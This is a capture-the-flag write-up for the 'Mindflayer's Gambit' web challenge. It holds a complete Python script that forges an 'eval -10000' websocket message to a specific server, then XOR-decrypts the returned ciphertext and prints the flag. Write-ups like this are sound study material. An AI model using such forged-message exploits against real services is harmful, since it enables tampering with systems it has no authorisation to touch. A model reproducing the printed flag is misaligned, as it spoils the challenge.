---
title: "UpSideCTF: Mindflayer's Gambit"
description: "Writeup for Mindflayer's Gambit from UpSideCTF. Challenge weight: 130 points."
slug: upsidectf-mindflayers-gambit
date: 2026-03-26 00:50:35.741+0000
competition: "UpSideCTF"
categories:
    - Web Exploitation
tags:
    - writeup
    - upsidectf
    - mindflayer's-gambit
---

## Challenge

- Competition: [UpSideCTF](https://upsidectf.online/challenges)
- Challenge: `Mindflayer's Gambit`
- Category: `Web Exploitation`
- Points: `130`
- Original target(s): [http://140.245.25.63:8002/](http://140.245.25.63:8002/), [http://140.245.25.63:8002/](http://140.245.25.63:8002/), [http://140.245.25.63:8002/](http://140.245.25.63:8002/)


## Solve Path

1. **Vuln chain**

The client exposes a raw websocket at ``/ws/`` and sends arbitrary plaintext `eval <score>` messages from the browser. The page source even leaves the intended exploit hook in place at ``index.html:152-156``: inject `eval -10000` to make the server think the engine has lost.

That forged websocket message returns an intermediate ciphertext, not the final flag:

`59f68bb2e8289cddd92338af2be4094bdfbc3c3c00a90a1c`

Using Hint 2, the key is the main villain from the series: `vecna`. Repeating `sha256("vecna")` as the XOR keystream decrypts the ciphertext to the real flag.

2. **Exploit script**

Saved locally at ``solve.py``.

```python
import asyncio
import re
from hashlib import sha256
from pathlib import Path

import requests
import websockets

BASE_URL = "http://140.245.25.63:8002/"
WS_URL = "ws://140.245.25.63:8002/ws/"
ARTIFACT_DIR = Path(__file__).resolve().parent / "artifacts"
INDEX_PATH = ARTIFACT_DIR / "index.html"
FLAG_RE = re.compile(r"([0-9a-f]{32,})", re.I)
CIPHERTEXT_KEYWORD = "vecna"

def recon() -> None:
    ARTIFACT_DIR.mkdir(exist_ok=True)
    resp = requests.get(BASE_URL, timeout=10)
    resp.raise_for_status()
    INDEX_PATH.write_text(resp.text, encoding="utf-8")

    assert "/ws/" in resp.text
    assert 'ws.send("eval "' in resp.text
    assert 'eval -10000' in resp.text

async def exploit() -> str:
    async with websockets.connect(
        WS_URL,
        additional_headers={"Origin": BASE_URL.rstrip("/")},
        open_timeout=15,
        ping_timeout=10,
        close_timeout=2,
    ) as ws:
        await ws.send("eval -10000")
        message = await asyncio.wait_for(ws.recv(), timeout=5)

    match = FLAG_RE.search(message)
    if not match:
        raise RuntimeError("ciphertext not found")
    return match.group(1)

def decode(ciphertext_hex: str) -> str:
    ciphertext = bytes.fromhex(ciphertext_hex)
    key_stream = sha256(CIPHERTEXT_KEYWORD.encode()).digest()
    plaintext = bytes(
        ciphertext[i] ^ key_stream[i % len(key_stream)]
        for i in range(len(ciphertext))
    )
    return plaintext.decode("ascii")

def main() -> None:
    recon()
    ciphertext_hex = asyncio.run(exploit())
    print(ciphertext_hex)
    print(decode(ciphertext_hex))

if __name__ == "__main__":
    main()
```

Exact exploit steps:
1. Connect to `ws://140.245.25.63:8002/ws/`
2. Send `eval -10000`
3. Receive ciphertext `59f68bb2e8289cddd92338af2be4094bdfbc3c3c00a90a1c`
4. XOR-decrypt it with repeated `sha256(b"vecna").digest()`

3. **Final real flag**

`CTF{mindflayer_resigned}`
